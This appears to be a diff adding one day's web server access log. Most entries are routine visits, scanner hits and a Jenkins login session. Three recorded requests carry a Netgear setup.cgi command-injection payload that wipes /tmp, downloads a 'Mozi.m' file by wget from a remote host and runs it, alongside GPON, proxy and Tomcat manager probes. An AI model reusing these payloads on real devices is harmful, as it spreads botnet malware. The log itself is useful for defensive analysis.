@@ -1,0 +1,63 @@
+79.111.119.241 - - [27/Nov/2021:00:57:18 +0000] "GET / HTTP/1.1" 200 11283
+209.17.97.98 - - [27/Nov/2021:01:16:22 +0000] "GET / HTTP/1.1" 200 11283
+167.250.140.170 - - [27/Nov/2021:04:31:07 +0000] "GET / HTTP/1.1" 200 11283
+104.206.128.14 - - [27/Nov/2021:05:11:48 +0000] "GET / HTTP/1.1" 200 11236
+71.6.146.130 - - [27/Nov/2021:05:18:47 +0000] "GET / HTTP/1.1" 200 11283
+71.6.146.130 - - [27/Nov/2021:05:18:47 +0000] "GET /favicon.ico HTTP/1.1" 200 21630
+71.6.146.130 - - [27/Nov/2021:05:18:47 +0000] "-" 400 -
+35.195.93.98 - - [27/Nov/2021:05:19:56 +0000] "GET / HTTP/1.1" 200 11283
+209.17.96.194 - - [27/Nov/2021:05:24:04 +0000] "-" 400 -
+104.140.188.22 - - [27/Nov/2021:06:12:40 +0000] "GET / HTTP/1.0" 200 11236
+49.37.169.198 - - [27/Nov/2021:06:25:59 +0000] "GET / HTTP/1.1" 200 11283
+49.37.169.198 - - [27/Nov/2021:06:26:01 +0000] "GET /favicon.ico HTTP/1.1" 200 21630
+49.37.169.198 - - [27/Nov/2021:06:26:10 +0000] "GET /jenkins/ HTTP/1.1" 403 577
+49.37.169.198 - - [27/Nov/2021:06:26:10 +0000] "GET /jenkins/login?from=%2Fjenkins%2F HTTP/1.1" 200 894
+49.37.169.198 - - [27/Nov/2021:06:26:19 +0000] "POST /jenkins/j_spring_security_check HTTP/1.1" 302 -
+49.37.169.198 - - [27/Nov/2021:06:26:21 +0000] "GET /jenkins/ HTTP/1.1" 200 5324
+49.37.169.198 - - [27/Nov/2021:06:26:27 +0000] "POST /jenkins/ajaxBuildQueue HTTP/1.1" 200 405
+49.37.169.198 - - [27/Nov/2021:06:26:27 +0000] "POST /jenkins/ajaxExecutors HTTP/1.1" 200 428
+49.37.169.198 - - [27/Nov/2021:06:26:32 +0000] "POST /jenkins/ajaxExecutors HTTP/1.1" 200 428
+49.37.169.198 - - [27/Nov/2021:06:26:32 +0000] "POST /jenkins/ajaxBuildQueue HTTP/1.1" 200 405
+49.37.169.198 - - [27/Nov/2021:06:26:34 +0000] "GET /jenkins/view/all/newJob HTTP/1.1" 200 2707
+49.37.169.198 - - [27/Nov/2021:06:26:34 +0000] "GET /jenkins/static/747a0610/jsbundles/add-item.js HTTP/1.1" 200 2667
+49.37.169.198 - - [27/Nov/2021:06:26:34 +0000] "GET /jenkins/static/747a0610/jsbundles/add-item.css HTTP/1.1" 200 5130
+49.37.169.198 - - [27/Nov/2021:06:26:34 +0000] "GET /jenkins/view/all/itemCategories?depth=3&iconStyle=icon-xlg HTTP/1.1" 200 1157
+49.37.169.198 - - [27/Nov/2021:06:26:35 +0000] "GET /jenkins/static/747a0610/images/48x48/freestyleproject.png HTTP/1.1" 200 2257
+49.37.169.198 - - [27/Nov/2021:06:26:35 +0000] "GET /jenkins/plugin/workflow-job/images/48x48/pipelinejob.png HTTP/1.1" 200 2367
+49.37.169.198 - - [27/Nov/2021:06:26:35 +0000] "GET /jenkins/plugin/matrix-project/images/48x48/matrixproject.png HTTP/1.1" 200 2438
+49.37.169.198 - - [27/Nov/2021:06:26:35 +0000] "GET /jenkins/static/747a0610/plugin/workflow-multibranch/images/48x48/pipelinemultibranchproject.png HTTP/1.1" 200 3421
+49.37.169.198 - - [27/Nov/2021:06:26:35 +0000] "GET /jenkins/static/747a0610/plugin/cloudbees-folder/images/48x48/folder.png HTTP/1.1" 200 1873
+49.37.169.198 - - [27/Nov/2021:06:26:35 +0000] "GET /jenkins/static/747a0610/plugin/branch-api/images/48x48/organization-folder.png HTTP/1.1" 200 3674
+49.37.169.198 - - [27/Nov/2021:06:26:44 +0000] "GET /jenkins/logout HTTP/1.1" 302 -
+49.37.169.198 - - [27/Nov/2021:06:26:44 +0000] "GET /jenkins/ HTTP/1.1" 403 577
+49.37.169.198 - - [27/Nov/2021:06:26:44 +0000] "GET /jenkins/login?from=%2Fjenkins%2F HTTP/1.1" 200 894
+49.37.169.198 - - [27/Nov/2021:06:28:15 +0000] "GET /jenkins/ HTTP/1.1" 403 577
+49.37.169.198 - - [27/Nov/2021:06:28:16 +0000] "GET /jenkins/login?from=%2Fjenkins%2F HTTP/1.1" 200 894
+128.14.141.34 - - [27/Nov/2021:06:35:14 +0000] "GET / HTTP/1.1" 200 11283
+85.119.151.251 - - [27/Nov/2021:06:53:31 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 -
+85.119.151.251 - - [27/Nov/2021:06:53:36 +0000] "-" 400 -
+85.119.151.252 - - [27/Nov/2021:06:53:41 +0000] "POST /ip.php?Z70602656130Q1 HTTP/1.1" 404 1012
+85.119.151.253 - - [27/Nov/2021:06:53:46 +0000] "-" 400 -
+162.142.125.194 - - [27/Nov/2021:07:16:03 +0000] "GET / HTTP/1.1" 200 11283
+162.142.125.194 - - [27/Nov/2021:07:16:03 +0000] "GET / HTTP/1.1" 200 11283
+192.241.207.12 - - [27/Nov/2021:07:47:14 +0000] "GET / HTTP/1.1" 200 11283
+92.118.160.33 - - [27/Nov/2021:08:40:31 +0000] "GET / HTTP/1.1" 200 11283
+205.185.118.227 - - [27/Nov/2021:11:24:29 +0000] "GET /manager/html HTTP/1.1" 403 3438
+75.109.213.184 - - [27/Nov/2021:12:22:45 +0000] "GET / HTTP/1.1" 200 11283
+46.174.191.29 - - [27/Nov/2021:13:28:24 +0000] "GET / HTTP/1.0" 200 11236
+104.131.118.135 - - [27/Nov/2021:13:38:03 +0000] "-" 400 -
+216.218.206.67 - - [27/Nov/2021:13:51:49 +0000] "GET / HTTP/1.1" 200 11283
+182.124.92.201 - - [27/Nov/2021:14:37:53 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.124.92.201:37697/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 1018
+190.92.33.24 - - [27/Nov/2021:15:24:06 +0000] "GET / HTTP/1.1" 200 11283
+197.232.60.155 - - [27/Nov/2021:16:16:42 +0000] "GET / HTTP/1.1" 200 11283
+31.200.68.89 - - [27/Nov/2021:17:07:57 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://31.200.68.89:33682/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 1018
+49.143.32.6 - - [27/Nov/2021:17:08:41 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 1018
+37.235.142.238 - - [27/Nov/2021:17:32:55 +0000] "GET / HTTP/1.1" 200 11283
+205.185.118.227 - - [27/Nov/2021:17:36:57 +0000] "GET /manager/html HTTP/1.1" 403 3438
+113.110.189.173 - - [27/Nov/2021:18:55:19 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 1036
+113.110.189.173 - - [27/Nov/2021:18:55:19 +0000] "-" 400 -
+78.128.112.14 - - [27/Nov/2021:19:38:09 +0000] "-" 400 -
+209.17.96.138 - - [27/Nov/2021:20:09:17 +0000] "GET / HTTP/1.1" 200 11283
+180.149.125.165 - - [27/Nov/2021:20:37:48 +0000] "GET /c/ HTTP/1.1" 404 1004
+185.136.193.25 - - [27/Nov/2021:22:43:12 +0000] "GET / HTTP/1.1" 200 11283
+205.185.118.227 - - [27/Nov/2021:23:18:07 +0000] "GET /manager/html HTTP/1.1" 403 3438
